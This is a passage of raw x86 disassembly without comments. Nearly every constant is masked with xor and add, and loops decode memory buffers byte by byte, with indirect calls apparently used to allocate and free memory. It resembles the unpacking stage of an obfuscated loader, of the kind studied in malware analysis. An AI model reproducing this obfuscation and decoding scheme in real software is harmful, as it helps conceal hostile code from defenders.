  425eb7:	lea    edx,[ebp-0x12c]
  425ebd:	call   0x428011
  425ec2:	push   eax
  425ec3:	call   DWORD PTR [ebp-0x14]
  425ec6:	mov    ecx,DWORD PTR [ebp-0x10]
  425ec9:	xor    ecx,ebx
  425ecb:	add    ecx,edi
  425ecd:	cmp    ecx,eax
  425ecf:	jne    0x425ed8
  425ed1:	mov    DWORD PTR [ebp-0x34],0x1
  425ed8:	mov    eax,DWORD PTR [ebp-0x18]
  425edb:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ede:	xor    eax,ebx
  425ee0:	lea    eax,[eax+ecx*1+0x3272f1]
  425ee7:	mov    DWORD PTR [ebp-0x1c],eax
  425eea:	mov    eax,DWORD PTR [ebp-0x34]
  425eed:	test   eax,eax
  425eef:	je     0x425f03
  425ef1:	mov    eax,DWORD PTR [ebp-0x18]
  425ef4:	mov    ecx,DWORD PTR [ebp-0x38]
  425ef7:	xor    eax,ebx
  425ef9:	lea    eax,[eax+ecx*1+0x3272f1]
  425f00:	mov    DWORD PTR [ebp-0x38],eax
  425f03:	mov    eax,DWORD PTR [ebp-0x18]
  425f06:	xor    eax,ebx
  425f08:	mov    ecx,0xffcd8d0f
  425f0d:	sub    ecx,eax
  425f0f:	add    ecx,DWORD PTR [ebp-0x28]
  425f12:	mov    eax,DWORD PTR [ebp-0x1c]
  425f15:	cmp    eax,ecx
  425f17:	jbe    0x425d7c
  425f1d:	mov    esi,edi
  425f1f:	mov    eax,DWORD PTR [ebp-0x38]
  425f22:	mov    ecx,DWORD PTR [ebp-0x1c]
  425f25:	cmp    ecx,eax
  425f27:	jne    0x425f3a
  425f29:	push   DWORD PTR [ebp+0x8]
  425f2c:	lea    eax,[ebp-0x40]
  425f2f:	push   eax
  425f30:	call   0x428a7e
  425f35:	mov    DWORD PTR [ebp-0x24],eax
  425f38:	jmp    0x425f46
  425f3a:	mov    eax,DWORD PTR [ebp-0x24]
  425f3d:	mov    ecx,DWORD PTR [ebp-0x18]
  425f40:	xor    ecx,ebx
  425f42:	add    ecx,esi
  425f44:	xor    DWORD PTR [eax],ecx
  425f46:	mov    eax,DWORD PTR [ebp-0x10]
  425f49:	mov    ecx,DWORD PTR [ebp-0x24]
  425f4c:	xor    eax,ebx
  425f4e:	add    eax,esi
  425f50:	cmp    eax,ecx
  425f52:	je     0x4266c9
  425f58:	mov    eax,DWORD PTR [ebp-0x10]
  425f5b:	mov    ecx,DWORD PTR [ebp-0x40]
  425f5e:	xor    eax,ebx
  425f60:	add    eax,esi
  425f62:	cmp    eax,ecx
  425f64:	je     0x4266c9
  425f6a:	mov    eax,DWORD PTR [ebp-0x10]
  425f6d:	xor    eax,ebx
  425f6f:	add    eax,esi
  425f71:	jmp    0x425f8f
  425f73:	mov    edi,DWORD PTR [ebp-0x24]
  425f76:	mov    cl,al
  425f78:	and    cl,0x1f
  425f7b:	or     dl,0xff
  425f7e:	sub    dl,cl
  425f80:	add    BYTE PTR [edi+eax*1],dl
  425f83:	mov    ecx,DWORD PTR [ebp-0x18]
  425f86:	xor    ecx,ebx
  425f88:	lea    eax,[eax+ecx*1+0x3272f1]
  425f8f:	mov    ecx,DWORD PTR [ebp-0x40]
  425f92:	cmp    eax,ecx
  425f94:	jb     0x425f73
  425f96:	mov    eax,DWORD PTR [ebp-0x40]
  425f99:	mov    DWORD PTR [ebp-0x28],eax
  425f9c:	mov    eax,DWORD PTR [ebp-0x24]
  425f9f:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  425fa6:	mov    DWORD PTR [ebp-0xd4],eax
  425fac:	mov    edi,0xf89c85ba
  425fb1:	mov    DWORD PTR [ebp-0x2c],edi
  425fb4:	mov    eax,DWORD PTR [ebp-0x38]
  425fb7:	xor    eax,ebx
  425fb9:	add    eax,esi
  425fbb:	mov    DWORD PTR [ebp-0xc],eax
  425fbe:	mov    eax,DWORD PTR [ebp-0x38]
  425fc1:	xor    eax,ebx
  425fc3:	add    eax,esi
  425fc5:	mov    DWORD PTR [ebp-0x8],eax
  425fc8:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  425fcf:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  425fd6:	mov    eax,DWORD PTR [ebp-0x38]
  425fd9:	mov    ecx,DWORD PTR [ebp-0x28]
  425fdc:	xor    eax,ebx
  425fde:	add    eax,esi
  425fe0:	cmp    ecx,eax
  425fe2:	je     0x4261e1
  425fe8:	jmp    0x4261bd
  425fed:	mov    ecx,DWORD PTR [ebp-0xc]
  425ff0:	mov    eax,DWORD PTR [ebp-0x28]
  425ff3:	sub    eax,ecx
  425ff5:	mov    ecx,DWORD PTR [ebp-0x48]
  425ff8:	xor    ecx,ebx
  425ffa:	add    ecx,esi
  425ffc:	xor    edx,edx
  425ffe:	div    ecx
  426000:	mov    DWORD PTR [ebp-0x8],eax
  426003:	mov    eax,DWORD PTR [ebp-0x4c]
  426006:	mov    ecx,DWORD PTR [ebp-0x8]
  426009:	xor    eax,ebx
  42600b:	add    eax,esi
  42600d:	cmp    ecx,eax
  42600f:	jbe    0x42601b
  426011:	mov    eax,DWORD PTR [ebp-0x4c]
  426014:	xor    eax,ebx
  426016:	add    eax,esi
  426018:	mov    DWORD PTR [ebp-0x8],eax
  42601b:	mov    eax,DWORD PTR [ebp-0x48]
  42601e:	mov    ecx,DWORD PTR [ebp-0x8]
  426021:	xor    eax,ebx
  426023:	add    eax,esi
  426025:	imul   eax,ecx
  426028:	mov    DWORD PTR [ebp-0x8],eax
  42602b:	mov    eax,DWORD PTR [ebp-0x38]
  42602e:	mov    ecx,DWORD PTR [ebp-0x8]
  426031:	xor    eax,ebx
  426033:	add    eax,esi
  426035:	cmp    ecx,eax
  426037:	je     0x4261ab
  42603d:	mov    eax,DWORD PTR [ebp-0x8]
  426040:	mov    DWORD PTR [ebp-0x14],eax
  426043:	mov    eax,DWORD PTR [ebp-0xc]
  426046:	add    eax,DWORD PTR [ebp-0xd4]
  42604c:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  426053:	mov    DWORD PTR [ebp-0x34],edi
  426056:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  426060:	mov    DWORD PTR [ebp-0x8],eax
  426063:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42606a:	mov    DWORD PTR [ebp-0x1c],edi
  42606d:	mov    eax,DWORD PTR [ebp-0x20]
  426070:	xor    eax,ebx
  426072:	add    eax,esi
  426074:	jmp    0x42616a
  426079:	mov    DWORD PTR [ebp-0xe0],0xf89c85b0
  426083:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  42608d:	mov    eax,DWORD PTR [ebp-0x1c]
  426090:	mov    ecx,DWORD PTR [ebp-0x44]
  426093:	xor    eax,ebx
  426095:	add    eax,esi
  426097:	imul   eax,ecx
  42609a:	mov    ecx,DWORD PTR [ebp-0x8]
  42609d:	mov    al,BYTE PTR [eax+ecx*1]
  4260a0:	mov    BYTE PTR [ebp-0x2],al
  4260a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4260a6:	mov    ecx,DWORD PTR [ebp-0x44]
  4260a9:	xor    eax,ebx
  4260ab:	add    eax,esi
  4260ad:	imul   eax,ecx
  4260b0:	mov    ecx,DWORD PTR [ebp-0xe8]
  4260b6:	xor    ecx,ebx
  4260b8:	add    eax,ecx
  4260ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4260bd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4260c5:	mov    ecx,DWORD PTR [ebp-0xe0]
  4260cb:	xor    ecx,ebx
  4260cd:	lea    eax,[ecx+eax*1+0x3272f1]
  4260d4:	movzx  ecx,BYTE PTR [ebp-0x2]
  4260d8:	xor    ecx,eax
  4260da:	mov    BYTE PTR [ebp-0x2],cl
  4260dd:	mov    al,BYTE PTR [ebp-0x2]
  4260e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4260e3:	mov    edx,DWORD PTR [ebp-0x44]
  4260e6:	xor    ecx,ebx
  4260e8:	add    ecx,esi
  4260ea:	imul   ecx,edx
  4260ed:	mov    edx,DWORD PTR [ebp-0x8]
  4260f0:	mov    BYTE PTR [ecx+edx*1],al
  4260f3:	mov    eax,DWORD PTR [ebp-0x1c]
  4260f6:	mov    ecx,DWORD PTR [ebp-0x44]
  4260f9:	xor    eax,ebx
  4260fb:	add    eax,esi
  4260fd:	imul   eax,ecx
  426100:	mov    ecx,DWORD PTR [ebp-0x8]
  426103:	mov    al,BYTE PTR [eax+ecx*1]
  426106:	mov    BYTE PTR [ebp-0x2],al
  426109:	mov    eax,DWORD PTR [ebp-0x1c]
  42610c:	mov    ecx,DWORD PTR [ebp-0x44]
  42610f:	xor    eax,ebx
  426111:	add    eax,esi
  426113:	imul   eax,ecx
  426116:	mov    ecx,DWORD PTR [ebp-0x34]
  426119:	xor    ecx,ebx
  42611b:	add    eax,ecx
  42611d:	mov    ecx,DWORD PTR [ebp-0x8]
  426120:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426128:	mov    ecx,DWORD PTR [ebp-0xc4]
  42612e:	xor    ecx,ebx
  426130:	lea    eax,[ecx+eax*1+0x3272f1]
  426137:	movzx  ecx,BYTE PTR [ebp-0x2]
  42613b:	xor    ecx,eax
  42613d:	mov    BYTE PTR [ebp-0x2],cl
  426140:	mov    al,BYTE PTR [ebp-0x2]
  426143:	mov    ecx,DWORD PTR [ebp-0x1c]
  426146:	mov    edx,DWORD PTR [ebp-0x44]
  426149:	xor    ecx,ebx
  42614b:	add    ecx,esi
  42614d:	imul   ecx,edx
  426150:	mov    edx,DWORD PTR [ebp-0x8]
  426153:	mov    BYTE PTR [ecx+edx*1],al
  426156:	mov    eax,DWORD PTR [ebp-0x30]
  426159:	mov    ecx,DWORD PTR [ebp-0x34]
  42615c:	xor    eax,ebx
  42615e:	xor    ecx,ebx
  426160:	add    eax,esi
  426162:	add    ecx,esi
  426164:	imul   eax,ecx
  426167:	add    eax,DWORD PTR [ebp-0x44]
  42616a:	mov    DWORD PTR [ebp-0x44],eax
  42616d:	mov    eax,DWORD PTR [ebp-0x44]
  426170:	mov    ecx,DWORD PTR [ebp-0x14]
  426173:	cmp    ecx,eax
  426175:	jb     0x426079
  42617b:	mov    eax,DWORD PTR [ebp-0x34]
  42617e:	mov    ecx,DWORD PTR [ebp-0x14]
  426181:	xor    eax,ebx
  426183:	add    eax,esi
  426185:	imul   eax,ecx
  426188:	mov    ecx,DWORD PTR [ebp-0x20]
  42618b:	xor    ecx,ebx
  42618d:	add    ecx,esi
  42618f:	or     eax,ecx
  426191:	mov    ecx,DWORD PTR [ebp-0x2c]
  426194:	xor    ecx,ebx
  426196:	add    eax,ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x2c]
  42619b:	xor    ecx,ebx
  42619d:	add    eax,ecx
  42619f:	mov    ecx,DWORD PTR [ebp-0xc]
  4261a2:	lea    eax,[eax+ecx*1+0x64e5e2]
  4261a9:	jmp    0x4261ba
  4261ab:	mov    eax,DWORD PTR [ebp-0x2c]
  4261ae:	mov    ecx,DWORD PTR [ebp-0xc]
  4261b1:	xor    eax,ebx
  4261b3:	lea    eax,[eax+ecx*1+0x3272f1]
  4261ba:	mov    DWORD PTR [ebp-0xc],eax
  4261bd:	mov    eax,DWORD PTR [ebp-0x2c]
  4261c0:	xor    eax,ebx
  4261c2:	mov    ecx,0xffcd8d0f
  4261c7:	sub    ecx,eax
  4261c9:	add    ecx,DWORD PTR [ebp-0x28]
  4261cc:	mov    eax,DWORD PTR [ebp-0x2c]
  4261cf:	mov    edx,DWORD PTR [ebp-0xc]
  4261d2:	xor    eax,ebx
  4261d4:	add    eax,esi
  4261d6:	imul   eax,edx
  4261d9:	cmp    eax,ecx
  4261db:	jbe    0x425fed
  4261e1:	mov    eax,DWORD PTR [ebp-0x10]
  4261e4:	mov    ecx,DWORD PTR [ebp-0x40]
  4261e7:	mov    eax,DWORD PTR [ebp+0x8]
  4261ea:	mov    edx,DWORD PTR [ebp-0x54]
  4261ed:	mov    eax,DWORD PTR [eax+0x1e0]
  4261f3:	xor    edx,ebx
  4261f5:	add    edx,esi
  4261f7:	push   edx
  4261f8:	mov    edx,DWORD PTR [ebp-0x3c]
  4261fb:	xor    edx,ebx
  4261fd:	add    edx,esi
  4261ff:	push   edx
  426200:	push   ecx
  426201:	mov    DWORD PTR [ebp-0x30],ecx
  426204:	mov    ecx,DWORD PTR [ebp-0x10]
  426207:	xor    ecx,ebx
  426209:	add    ecx,esi
  42620b:	push   ecx
  42620c:	call   DWORD PTR [eax+0x14]
  42620f:	mov    edi,eax
  426211:	mov    eax,DWORD PTR [ebp-0x10]
  426214:	xor    eax,ebx
  426216:	add    eax,esi
  426218:	cmp    eax,edi
  42621a:	je     0x426275
  42621c:	mov    eax,DWORD PTR [ebp-0x10]
  42621f:	jmp    0x426242
  426221:	mov    ecx,DWORD PTR [ebp-0x24]
  426224:	xor    eax,ebx
  426226:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f1]
  42622d:	mov    BYTE PTR [eax+edi*1+0x3272f1],cl
  426234:	mov    ecx,DWORD PTR [ebp-0x18]
  426237:	xor    ecx,ebx
  426239:	lea    eax,[ecx+eax*1+0x3272f1]
  426240:	xor    eax,ebx
  426242:	mov    ecx,DWORD PTR [ebp-0x40]
  426245:	sub    ecx,esi
  426247:	xor    ecx,ebx
  426249:	cmp    eax,ecx
  42624b:	jne    0x426221
  42624d:	mov    eax,DWORD PTR [ebp+0x8]
  426250:	mov    ecx,DWORD PTR [ebp-0x50]
  426253:	mov    eax,DWORD PTR [eax+0x1e0]
  426259:	xor    ecx,ebx
  42625b:	add    ecx,esi
  42625d:	push   ecx
  42625e:	mov    ecx,DWORD PTR [ebp-0x10]
  426261:	xor    ecx,ebx
  426263:	add    ecx,esi
  426265:	push   ecx
  426266:	push   DWORD PTR [ebp-0x24]
  426269:	call   DWORD PTR [eax+0x18]
  42626c:	mov    eax,DWORD PTR [ebp-0x30]
  42626f:	mov    DWORD PTR [ebp-0x24],edi
  426272:	mov    DWORD PTR [ebp-0x40],eax
  426275:	mov    edi,DWORD PTR [ebp-0x24]
  426278:	mov    eax,DWORD PTR [ebp-0x18]
  42627b:	mov    ecx,DWORD PTR [ebp-0x10]
  42627e:	xor    eax,ebx
  426280:	mov    DWORD PTR [ebp-0x30],edi
  426283:	add    eax,esi
  426285:	mov    DWORD PTR [ebp-0x5c],0x3c2b332b
  42628c:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  426293:	jmp    0x4262c6
  426295:	xor    ecx,ebx
  426297:	mov    dl,BYTE PTR [ebp+ecx*1+0x327295]
  42629e:	xor    dl,0x7c
  4262a1:	inc    dl
  4262a3:	mov    DWORD PTR [ebp-0x3c],ecx
  4262a6:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f1]
  4262ae:	movzx  edx,dl
  4262b1:	cmp    ecx,edx
  4262b3:	jne    0x4262d0
  4262b5:	mov    ecx,DWORD PTR [ebp-0x18]
  4262b8:	mov    edx,DWORD PTR [ebp-0x3c]
  4262bb:	xor    ecx,ebx
  4262bd:	lea    ecx,[ecx+edx*1+0x3272f1]
  4262c4:	xor    ecx,ebx
  4262c6:	cmp    ecx,0xf89c85bd
  4262cc:	jne    0x426295
  4262ce:	jmp    0x4262d7
  4262d0:	mov    eax,DWORD PTR [ebp-0x10]
  4262d3:	xor    eax,ebx
  4262d5:	add    eax,esi
  4262d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4262da:	xor    ecx,ebx
  4262dc:	add    ecx,esi
  4262de:	cmp    ecx,eax
  4262e0:	je     0x426453
  4262e6:	mov    eax,DWORD PTR [edi+0x8]
  4262e9:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4262f0:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  4262f7:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  4262fe:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  426305:	mov    DWORD PTR [ebp-0x14],eax
  426308:	mov    eax,DWORD PTR [ebp+0x8]
  42630b:	mov    ecx,DWORD PTR [ebp-0x20]
  42630e:	xor    ecx,ebx
  426310:	add    ecx,esi
  426312:	push   ecx
  426313:	mov    ecx,DWORD PTR [ebp-0x48]
  426316:	mov    eax,DWORD PTR [eax+0x1e0]
  42631c:	xor    ecx,ebx
  42631e:	add    ecx,esi
  426320:	push   ecx
  426321:	mov    ecx,DWORD PTR [ebp-0x3c]
  426324:	xor    ecx,ebx
  426326:	add    ecx,esi
  426328:	push   ecx
  426329:	mov    ecx,DWORD PTR [ebp-0xc]
  42632c:	xor    ecx,ebx
  42632e:	add    ecx,esi
  426330:	push   ecx
  426331:	call   DWORD PTR [eax+0x14]
  426334:	mov    edi,eax
  426336:	mov    eax,DWORD PTR [ebp+0x8]
  426339:	mov    ecx,DWORD PTR [ebp-0x20]
  42633c:	mov    eax,DWORD PTR [eax+0x1e0]
  426342:	xor    ecx,ebx
  426344:	add    ecx,esi
  426346:	push   ecx
  426347:	mov    ecx,DWORD PTR [ebp-0x48]
  42634a:	xor    ecx,ebx
  42634c:	add    ecx,esi
  42634e:	push   ecx
  42634f:	mov    ecx,DWORD PTR [ebp-0xc]
  426352:	push   DWORD PTR [ebp-0x14]
  426355:	xor    ecx,ebx
  426357:	add    ecx,esi
  426359:	push   ecx
  42635a:	call   DWORD PTR [eax+0x14]
  42635d:	mov    ecx,DWORD PTR [ebp-0xc]
  426360:	xor    ecx,ebx
  426362:	add    ecx,esi
  426364:	mov    DWORD PTR [ebp-0x20],eax
  426367:	cmp    ecx,edi
  426369:	je     0x4266f6
  42636f:	mov    ecx,DWORD PTR [ebp-0xc]
  426372:	xor    ecx,ebx
  426374:	add    ecx,esi
  426376:	cmp    ecx,eax
  426378:	je     0x4266f6
  42637e:	mov    DWORD PTR [ebp-0x3c],0xf89c85b8
  426385:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  42638c:	mov    ecx,DWORD PTR [ebp-0x3c]
  42638f:	xor    cl,0xaa
  426392:	sub    cl,0xf
  426395:	mov    BYTE PTR [edi],cl
  426397:	mov    ecx,DWORD PTR [ebp-0xc]
  42639a:	xor    cl,0xaa
  42639d:	sub    cl,0xf
  4263a0:	mov    BYTE PTR [edi+0x1],cl
  4263a3:	mov    ecx,DWORD PTR [ebp-0x54]
  4263a6:	xor    cl,0xaa
  4263a9:	sub    cl,0xf
  4263ac:	mov    BYTE PTR [edi+0x2],cl
  4263af:	and    DWORD PTR [ebp-0xc8],0x0
  4263b6:	and    DWORD PTR [ebp-0xdc],0x0
  4263bd:	lea    ecx,[ebp-0xdc]
  4263c3:	push   ecx
  4263c4:	push   DWORD PTR [ebp-0x14]
  4263c7:	push   eax
  4263c8:	lea    eax,[ebp-0xc8]
  4263ce:	push   eax
  4263cf:	mov    eax,DWORD PTR [ebp-0x30]
  4263d2:	push   DWORD PTR [eax+0xc]
  4263d5:	mov    eax,DWORD PTR [ebp-0x24]
  4263d8:	add    eax,0x10
  4263db:	push   eax
  4263dc:	push   edi
  4263dd:	call   0x425684
  4263e2:	mov    DWORD PTR [ebp-0x3c],eax
  4263e5:	mov    eax,DWORD PTR [ebp+0x8]
  4263e8:	mov    ecx,DWORD PTR [ebp-0x50]
  4263eb:	mov    eax,DWORD PTR [eax+0x1e0]
  4263f1:	xor    ecx,ebx
  4263f3:	add    ecx,esi
  4263f5:	push   ecx
  4263f6:	mov    ecx,DWORD PTR [ebp-0xc]
  4263f9:	xor    ecx,ebx
  4263fb:	add    ecx,esi
  4263fd:	push   ecx
  4263fe:	push   edi
  4263ff:	call   DWORD PTR [eax+0x18]
  426402:	mov    eax,DWORD PTR [ebp-0x3c]
  426405:	add    eax,0xffcd8d0f
  42640a:	xor    eax,ebx
  42640c:	cmp    eax,0xf89c85a5
  426411:	mov    eax,DWORD PTR [ebp+0x8]
  426414:	mov    eax,DWORD PTR [eax+0x1e0]
  42641a:	mov    ecx,DWORD PTR [ebp-0x50]
  42641d:	jne    0x426440
  42641f:	xor    ecx,ebx
  426421:	add    ecx,esi
  426423:	push   ecx
  426424:	mov    ecx,DWORD PTR [ebp-0xc]
  426427:	xor    ecx,ebx
  426429:	add    ecx,esi
  42642b:	push   ecx
  42642c:	push   DWORD PTR [ebp-0x24]
  42642f:	call   DWORD PTR [eax+0x18]
  426432:	mov    eax,DWORD PTR [ebp-0x20]
  426435:	mov    DWORD PTR [ebp-0x24],eax
  426438:	mov    eax,DWORD PTR [ebp-0x14]
  42643b:	mov    DWORD PTR [ebp-0x40],eax
  42643e:	jmp    0x426453
  426440:	xor    ecx,ebx
  426442:	add    ecx,esi
  426444:	push   ecx
  426445:	mov    ecx,DWORD PTR [ebp-0xc]
  426448:	xor    ecx,ebx
  42644a:	add    ecx,esi
  42644c:	push   ecx
  42644d:	push   DWORD PTR [ebp-0x20]
  426450:	call   DWORD PTR [eax+0x18]
  426453:	mov    eax,DWORD PTR [ebp-0x40]
  426456:	mov    DWORD PTR [ebp-0x38],eax
  426459:	mov    eax,DWORD PTR [ebp-0x24]
  42645c:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  426463:	mov    DWORD PTR [ebp-0x3c],eax
  426466:	mov    edi,0xf89c85ba
  42646b:	mov    DWORD PTR [ebp-0x2c],edi
  42646e:	mov    eax,DWORD PTR [ebp-0x28]
  426471:	xor    eax,ebx
  426473:	add    eax,esi
  426475:	mov    DWORD PTR [ebp-0xc],eax
  426478:	mov    eax,DWORD PTR [ebp-0x28]
  42647b:	xor    eax,ebx
  42647d:	add    eax,esi
  42647f:	mov    DWORD PTR [ebp-0x14],eax
  426482:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  426489:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  426490:	mov    eax,DWORD PTR [ebp-0x28]
  426493:	mov    ecx,DWORD PTR [ebp-0x38]
  426496:	xor    eax,ebx
  426498:	add    eax,esi
  42649a:	cmp    ecx,eax
  42649c:	je     0x426692
  4264a2:	jmp    0x42666e
  4264a7:	mov    ecx,DWORD PTR [ebp-0xc]
  4264aa:	mov    eax,DWORD PTR [ebp-0x38]
  4264ad:	sub    eax,ecx
  4264af:	mov    ecx,DWORD PTR [ebp-0x48]
  4264b2:	xor    ecx,ebx
  4264b4:	add    ecx,esi
  4264b6:	xor    edx,edx
  4264b8:	div    ecx
  4264ba:	mov    DWORD PTR [ebp-0x14],eax
  4264bd:	mov    eax,DWORD PTR [ebp-0x20]
  4264c0:	mov    ecx,DWORD PTR [ebp-0x14]
  4264c3:	xor    eax,ebx
  4264c5:	add    eax,esi
  4264c7:	cmp    ecx,eax
  4264c9:	jbe    0x4264d5
  4264cb:	mov    eax,DWORD PTR [ebp-0x20]
  4264ce:	xor    eax,ebx
  4264d0:	add    eax,esi
  4264d2:	mov    DWORD PTR [ebp-0x14],eax
  4264d5:	mov    eax,DWORD PTR [ebp-0x48]
  4264d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4264db:	xor    eax,ebx
  4264dd:	add    eax,esi
  4264df:	imul   eax,ecx
  4264e2:	mov    DWORD PTR [ebp-0x14],eax
  4264e5:	mov    eax,DWORD PTR [ebp-0x28]
  4264e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4264eb:	xor    eax,ebx
  4264ed:	add    eax,esi
  4264ef:	cmp    ecx,eax
  4264f1:	je     0x42665c
  4264f7:	mov    eax,DWORD PTR [ebp-0x14]
  4264fa:	mov    DWORD PTR [ebp-0x34],eax
  4264fd:	mov    eax,DWORD PTR [ebp-0xc]
  426500:	add    eax,DWORD PTR [ebp-0x3c]
  426503:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  42650a:	mov    DWORD PTR [ebp-0x14],edi
  42650d:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  426514:	mov    DWORD PTR [ebp-0x1c],eax
  426517:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42651e:	mov    DWORD PTR [ebp-0x8],edi
  426521:	mov    eax,DWORD PTR [ebp-0x4c]
  426524:	xor    eax,ebx
  426526:	add    eax,esi
  426528:	jmp    0x42661b
  42652d:	mov    DWORD PTR [ebp-0xe4],0xf89c85b0
  426537:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426541:	mov    eax,DWORD PTR [ebp-0x8]
  426544:	mov    ecx,DWORD PTR [ebp-0x18]
  426547:	xor    eax,ebx
  426549:	add    eax,esi
  42654b:	imul   eax,ecx
  42654e:	mov    ecx,DWORD PTR [ebp-0x1c]
  426551:	mov    al,BYTE PTR [eax+ecx*1]
  426554:	mov    BYTE PTR [ebp-0x1],al
  426557:	mov    eax,DWORD PTR [ebp-0x8]
  42655a:	mov    ecx,DWORD PTR [ebp-0x18]
  42655d:	xor    eax,ebx
  42655f:	add    eax,esi
  426561:	imul   eax,ecx
  426564:	mov    ecx,DWORD PTR [ebp-0x54]
  426567:	xor    ecx,ebx
  426569:	add    eax,ecx
  42656b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42656e:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426576:	mov    ecx,DWORD PTR [ebp-0xe4]
  42657c:	xor    ecx,ebx
  42657e:	lea    eax,[ecx+eax*1+0x3272f1]
  426585:	movzx  ecx,BYTE PTR [ebp-0x1]
  426589:	xor    ecx,eax
  42658b:	mov    BYTE PTR [ebp-0x1],cl
  42658e:	mov    al,BYTE PTR [ebp-0x1]
  426591:	mov    ecx,DWORD PTR [ebp-0x8]
  426594:	mov    edx,DWORD PTR [ebp-0x18]
  426597:	xor    ecx,ebx
  426599:	add    ecx,esi
  42659b:	imul   ecx,edx
  42659e:	mov    edx,DWORD PTR [ebp-0x1c]
  4265a1:	mov    BYTE PTR [ecx+edx*1],al
  4265a4:	mov    eax,DWORD PTR [ebp-0x8]
  4265a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4265aa:	xor    eax,ebx
  4265ac:	add    eax,esi
  4265ae:	imul   eax,ecx
  4265b1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4265b4:	mov    al,BYTE PTR [eax+ecx*1]
  4265b7:	mov    BYTE PTR [ebp-0x1],al
  4265ba:	mov    eax,DWORD PTR [ebp-0x8]
  4265bd:	mov    ecx,DWORD PTR [ebp-0x18]
  4265c0:	xor    eax,ebx
  4265c2:	add    eax,esi
  4265c4:	imul   eax,ecx
  4265c7:	mov    ecx,DWORD PTR [ebp-0x14]
  4265ca:	xor    ecx,ebx
  4265cc:	add    eax,ecx
  4265ce:	mov    ecx,DWORD PTR [ebp-0x1c]
  4265d1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4265d9:	mov    ecx,DWORD PTR [ebp-0xd0]
  4265df:	xor    ecx,ebx
  4265e1:	lea    eax,[ecx+eax*1+0x3272f1]
  4265e8:	movzx  ecx,BYTE PTR [ebp-0x1]
  4265ec:	xor    ecx,eax
  4265ee:	mov    BYTE PTR [ebp-0x1],cl
  4265f1:	mov    al,BYTE PTR [ebp-0x1]
  4265f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4265f7:	mov    edx,DWORD PTR [ebp-0x18]
  4265fa:	xor    ecx,ebx
  4265fc:	add    ecx,esi
  4265fe:	imul   ecx,edx
  426601:	mov    edx,DWORD PTR [ebp-0x1c]
  426604:	mov    BYTE PTR [ecx+edx*1],al
  426607:	mov    eax,DWORD PTR [ebp-0x30]
  42660a:	mov    ecx,DWORD PTR [ebp-0x14]
  42660d:	xor    eax,ebx
  42660f:	xor    ecx,ebx
  426611:	add    eax,esi
  426613:	add    ecx,esi
  426615:	imul   eax,ecx
  426618:	add    eax,DWORD PTR [ebp-0x18]
  42661b:	mov    DWORD PTR [ebp-0x18],eax
  42661e:	mov    eax,DWORD PTR [ebp-0x18]
  426621:	mov    ecx,DWORD PTR [ebp-0x34]
  426624:	cmp    ecx,eax
  426626:	jb     0x42652d
  42662c:	mov    eax,DWORD PTR [ebp-0x14]
  42662f:	mov    ecx,DWORD PTR [ebp-0x34]
  426632:	xor    eax,ebx
  426634:	add    eax,esi
  426636:	imul   eax,ecx
  426639:	mov    ecx,DWORD PTR [ebp-0x4c]
  42663c:	xor    ecx,ebx
  42663e:	add    ecx,esi
  426640:	or     eax,ecx
  426642:	mov    ecx,DWORD PTR [ebp-0x2c]
  426645:	xor    ecx,ebx
  426647:	add    eax,ecx
  426649:	mov    ecx,DWORD PTR [ebp-0x2c]
  42664c:	xor    ecx,ebx
  42664e:	add    eax,ecx
  426650:	mov    ecx,DWORD PTR [ebp-0xc]
  426653:	lea    eax,[eax+ecx*1+0x64e5e2]
  42665a:	jmp    0x42666b
  42665c:	mov    eax,DWORD PTR [ebp-0x2c]
  42665f:	mov    ecx,DWORD PTR [ebp-0xc]
  426662:	xor    eax,ebx
  426664:	lea    eax,[eax+ecx*1+0x3272f1]
  42666b:	mov    DWORD PTR [ebp-0xc],eax
  42666e:	mov    eax,DWORD PTR [ebp-0x2c]
  426671:	xor    eax,ebx
  426673:	mov    ecx,0xffcd8d0f
  426678:	sub    ecx,eax
  42667a:	add    ecx,DWORD PTR [ebp-0x38]
  42667d:	mov    eax,DWORD PTR [ebp-0x2c]
  426680:	mov    edx,DWORD PTR [ebp-0xc]
  426683:	xor    eax,ebx
  426685:	add    eax,esi
  426687:	imul   eax,edx
  42668a:	cmp    eax,ecx
  42668c:	jbe    0x4264a7
  426692:	push   DWORD PTR [ebp+0x8]
  426695:	mov    eax,DWORD PTR [ebp+0x8]
  426698:	push   DWORD PTR [eax+0x1cc]
  42669e:	lea    eax,[ebp-0xd8]
  4266a4:	push   eax
  4266a5:	mov    eax,DWORD PTR [ebp+0x8]
